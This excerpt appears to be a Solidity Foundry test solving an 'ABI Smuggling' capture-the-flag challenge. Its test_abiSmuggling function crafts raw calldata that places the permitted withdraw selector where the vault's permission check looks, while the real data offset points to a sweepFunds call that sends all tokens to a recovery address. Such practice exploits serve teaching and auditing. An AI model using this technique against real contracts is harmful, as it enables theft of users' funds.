...
contract ABISmugglingChallenge is Test {
    ...
    function slice(bytes memory arr, uint256 begin) public pure returns (bytes memory) {
        bytes memory result;
        for(uint256 i=begin; i < arr.length; i++) {
            result = bytes.concat(result, arr[i]);
        }
        return result;
    }
    ...
    function test_abiSmuggling() public checkSolvedByPlayer {
        // execute -  0x1cff79cd
        // withdraw - 0xd9caed12
        // sweepFunds - 0x85fb709d
        // setPermissions - 0xaeabae6b
        bytes memory innerCalldata = abi.encodeCall(SelfAuthorizedVault.sweepFunds, (recovery, IERC20(address(token))));
        bytes memory encoded = abi.encode(innerCalldata);
        bytes memory payload = abi.encodePacked(bytes4(hex"1cff79cd"), abi.encode(uint160(address(vault))), uint256(32*3+4), uint256(0), bytes4(hex"d9caed12"), slice(encoded, 32));

        (bool success, bytes memory result) = address(vault).call{value: 0, gas: 300000}(payload);
